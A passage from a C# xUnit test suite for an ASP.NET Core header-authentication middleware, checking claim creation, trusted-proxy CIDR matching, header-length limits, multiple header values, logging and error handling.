                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        var testUser = CreateTestUser();

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync(testUser);
        Mock.Mock<IUserService>()
            .Setup(x => x.GetRolesAsync(testUser))
            .ReturnsAsync(["User", "Admin"]);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.GetRolesAsync(testUser), Times.Once);
    }

    [Fact]
    public async Task ShouldCreateClaimsWithoutEmail_WhenUserHasNoEmail()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        var testUser = new AppUser
        {
            Id = TEST_USER_ID,
            UserName = TEST_USERNAME,
            Email = null, // No email
        };

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync(testUser);
        Mock.Mock<IUserService>().Setup(x => x.GetRolesAsync(testUser)).ReturnsAsync(["User"]);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.GetRolesAsync(testUser), Times.Once);
    }

    [Fact]
    public async Task ShouldCreateClaimsWithEmptyEmail_WhenUserHasEmptyEmail()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        var testUser = new AppUser
        {
            Id = TEST_USER_ID,
            UserName = TEST_USERNAME,
            Email = "", // Empty email
        };

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync(testUser);
        Mock.Mock<IUserService>().Setup(x => x.GetRolesAsync(testUser)).ReturnsAsync(["User"]);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.GetRolesAsync(testUser), Times.Once);
    }

    [Fact]
    public async Task ShouldCreateClaimsWithEmptyUsername_WhenUserHasNullUsername()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        var testUser = new AppUser
        {
            Id = TEST_USER_ID,
            UserName = null, // Null username
            Email = TEST_EMAIL,
        };

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync(testUser);
        Mock.Mock<IUserService>().Setup(x => x.GetRolesAsync(testUser)).ReturnsAsync(["User"]);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.GetRolesAsync(testUser), Times.Once);
    }

    #endregion

    #region Additional Security Tests

    [Fact]
    public async Task ShouldHandleMultipleHeaderValues_WhenHeaderHasMultipleValues()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = new StringValues([TEST_USERNAME, "malicious_user"]);
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        // Should use the first value only
        Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync("malicious_user"), Times.Never);
    }

    [Fact]
    public async Task ShouldTrimWhitespaceFromHeaderValue_WhenHeaderValueHasWhitespace()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = "  " + TEST_USERNAME + "  ";
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        // Should call with trimmed value
        Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
    }

    [Fact]
    public async Task ShouldNotLogSensitiveInformation_WhenLoggingIsDisabled()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldNotContain(e => e.MessageTemplate.Text.Contains("The wrong user is passed in"));
    }

    [Theory]
    [InlineData("0.0.0.0/0", "8.8.8.8", true)] // Global range
    [InlineData("0.0.0.0/0", "192.168.1.1", true)] // Global range
    [InlineData("0.0.0.0/0", "10.0.0.1", true)] // Global range
    [InlineData("0.0.0.0/0", "::1", false)] // Global range with IPv6 - IPv6 addresses don't match IPv4 CIDR ranges
    public async Task ShouldHandleGlobalCidrRange_WhenGlobalRangeIsConfigured(
        string cidrRange,
        string requestIp,
        bool shouldBeTrusted)
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse(requestIp);

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = [cidrRange],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        // Verify the expected behavior based on shouldBeTrusted
        if (shouldBeTrusted)
        {
            // Should attempt authentication
            Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        }
        else
        {
            // Should not attempt authentication
            Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(It.IsAny<string>()), Times.Never);
        }
    }

    [Fact]
    public async Task ShouldHandleIPv4MappedIPv6Address_WhenAddressIsMapped()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;

        // Create an IPv4-mapped IPv6 address
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1").MapToIPv6();

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Theory]
    [InlineData("192.168.1.0/32", "192.168.1.0", true)] // Single host
    [InlineData("192.168.1.0/32", "192.168.1.1", false)] // Different host
    [InlineData("192.168.1.1/32", "192.168.1.1", true)] // Exact match
    [InlineData("192.168.1.1/32", "192.168.1.2", false)] // Different host
    public async Task ShouldHandleSingleHostCidr_WhenCidrIs32(string cidrRange, string requestIp, bool shouldBeTrusted)
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse(requestIp);

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = [cidrRange],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        // Verify the expected behavior based on shouldBeTrusted
        if (shouldBeTrusted)
        {
            // Should attempt authentication
            Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        }
        else
        {
            // Should not attempt authentication
            Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(It.IsAny<string>()), Times.Never);
        }
    }

    [Fact]
    public async Task ShouldHandleInvalidCidrRange_WhenCidrIsMalformed()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/33"], // Invalid CIDR
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Fact]
    public async Task ShouldHandleEmptyCidrRange_WhenCidrIsEmpty()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = [""], // Empty CIDR
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Fact]
    public async Task ShouldHandleNullCidrRange_WhenCidrIsNull()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = [null!], // Null CIDR
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    #endregion

    #region Performance and Stress Tests

    [Fact]
    public async Task ShouldHandleLargeNumberOfTrustedProxies_WhenManyProxiesConfigured()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        // Create a large list of trusted proxies
        var trustedProxies = new List<string>();
        for (var i = 0; i < 1000; i++)
        {
            trustedProxies.Add($"192.168.{i % 256}.0/24");
        }

        trustedProxies.Add("192.168.1.0/24"); // Include our test IP

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = trustedProxies,
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Fact]
    public async Task ShouldHandleConcurrentRequests_WhenMultipleRequestsProcessed()
    {
        // Arrange
        var tasks = new List<Task>();
        var results = new List<bool>();

        // Setup authentication settings once
        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Create a single middleware instance to avoid AutoMock concurrency issues
        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(It.IsAny<HttpContext>()))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));

        for (var i = 0; i < 10; i++)
        {
            var task = Task.Run(async () =>
            {
                var context = CreateHttpContext();
                context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
                context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

                // Act
                await sut.InvokeAsync(context);

                // Assert
                lock (results)
                {
                    results.Add(nextCalled);
                }
            }, TestContext.Current.CancellationToken);

            tasks.Add(task);
        }

        // Act
        await Task.WhenAll(tasks);

        // Assert
        results.Count.ShouldBe(10);
        results.All(r => r).ShouldBeTrue();
    }

    #endregion

    #region Error Handling Tests

    [Fact]
    public async Task ShouldHandleUserServiceException_WhenUserServiceThrows()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>()
            .Setup(x => x.FindByNameAsync(TEST_USERNAME))
            .ThrowsAsync(new InvalidOperationException("Database connection failed"));

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act & Assert
        await Should.ThrowAsync<InvalidOperationException>(async () =>
            await Sut.InvokeAsync(context));
    }

    [Fact]
    public async Task ShouldHandleRoleServiceException_WhenRoleServiceThrows()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        var testUser = CreateTestUser();

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync(testUser);
        Mock.Mock<IUserService>()
            .Setup(x => x.GetRolesAsync(testUser))
            .ThrowsAsync(new InvalidOperationException("Role service unavailable"));

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act & Assert
        await Should.ThrowAsync<InvalidOperationException>(async () =>
            await Sut.InvokeAsync(context));
    }

    #endregion

    #region Boundary Value Tests

    [Theory]
    [InlineData(1, true)] // Minimum valid length
    [InlineData(256, true)] // Maximum default length
    [InlineData(257, false)] // Exceeds default maximum
    [InlineData(0, false)] // Zero length
    public async Task ShouldValidateHeaderLengthBoundaries_WhenHeaderLengthIsAtBoundaries(
        int headerLength,
        bool shouldPass)
    {
        // Arrange
        var context = CreateHttpContext();
        var headerValue = headerLength >= 0 ? new string('A', headerLength) : string.Empty;
        context.Request.Headers[TEST_HEADER_NAME] = headerValue;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 256,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        if (shouldPass)
        {
            Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(headerValue)).ReturnsAsync((AppUser?)null);
        }

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
    }

    [Theory]
    [InlineData("192.168.1.0/0", "192.168.1.1", true)] // Minimum CIDR
    [InlineData("192.168.1.0/32", "192.168.1.0", true)] // Maximum CIDR for IPv4 (exact match)
    [InlineData("192.168.1.0/33", "192.168.1.1", false)] // Invalid CIDR for IPv4
    [InlineData("2001:db8::/128", "2001:db8::", true)] // Maximum CIDR for IPv6 (exact match)
    [InlineData("2001:db8::/129", "2001:db8::1", false)] // Invalid CIDR for IPv6
    public async Task ShouldValidateCidrBoundaries_WhenCidrIsAtBoundaries(
        string cidrRange,
        string testIp,
        bool shouldBeValid)
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Connection.RemoteIpAddress = IPAddress.Parse(testIp);

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = [cidrRange],
            EnableLogging = true, // Enable logging to see what's happening
            MaxHeaderLength = 100,
            RequireHttps = false,
        };

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync((AppUser?)null);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate), next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);

        // Verify the expected behavior based on shouldBeValid
        if (shouldBeValid)
        {
            // Should attempt authentication for valid CIDR
            Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        }
        else
        {
            // Should not attempt authentication for invalid CIDR
            Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(It.IsAny<string>()), Times.Never);
        }
    }

    #endregion

    #region Integration-Style Tests

    [Fact]
    public async Task ShouldCompleteFullAuthenticationFlow_WhenAllConditionsMet()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = TEST_USERNAME;
        context.Request.IsHttps = true;
        context.Connection.RemoteIpAddress = IPAddress.Parse("192.168.1.1");

        var nextCalled = false;
        var next = new Mock<RequestDelegate>();
        next.Setup(x => x(context))
            .Returns(() =>
            {
                nextCalled = true;
                return Task.CompletedTask;
            });

        var headerAuthSettings = new HeaderAuthenticationSettings
        {
            Enabled = true,
            MappingType = HeaderMappingType.Username,
            TrustedProxies = ["192.168.1.0/24"],
            EnableLogging = false,
            MaxHeaderLength = 100,
            RequireHttps = false,
        };
        headerAuthSettings.RequireHttps = true;
        headerAuthSettings.MaxHeaderLength = 256;
        headerAuthSettings.EnableLogging = true;

        var authSettings = AuthenticationModule.Create();
        authSettings.HeaderAuthentication = headerAuthSettings;

        var testUser = CreateTestUser();

        // Configure UserService mock in AutoMock
        Mock.Mock<IUserService>().Setup(x => x.FindByNameAsync(TEST_USERNAME)).ReturnsAsync(testUser);
        Mock.Mock<IUserService>()
            .Setup(x => x.GetRolesAsync(testUser))
            .ReturnsAsync(["User", "Admin"]);

        SetupAuthenticationSettings(authSettings.HeaderAuthentication);

        using var correlatorContext = TestCorrelator.CreateContext();

        // Act
        var sut = Mock.Create<HeaderAuthenticationMiddleware>(new TypedParameter(typeof(RequestDelegate),
            next.Object));
        await sut.InvokeAsync(context);

        // Assert
        nextCalled.ShouldBeTrue();
        next.Verify(x => x(context), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.FindByNameAsync(TEST_USERNAME), Times.Once);
        Mock.Mock<IUserService>().Verify(x => x.GetRolesAsync(testUser), Times.Once);

        var logEvents = TestCorrelator.GetLogEventsFromCurrentContext();
        logEvents.ShouldContain(e => e.MessageTemplate.Text.Contains("User authenticated via header"));
    }

    [Fact]
    public async Task ShouldRejectRequest_WhenAllSecurityChecksFail()
    {
        // Arrange
        var context = CreateHttpContext();
        context.Request.Headers[TEST_HEADER_NAME] = new string('A', 300); // Too long
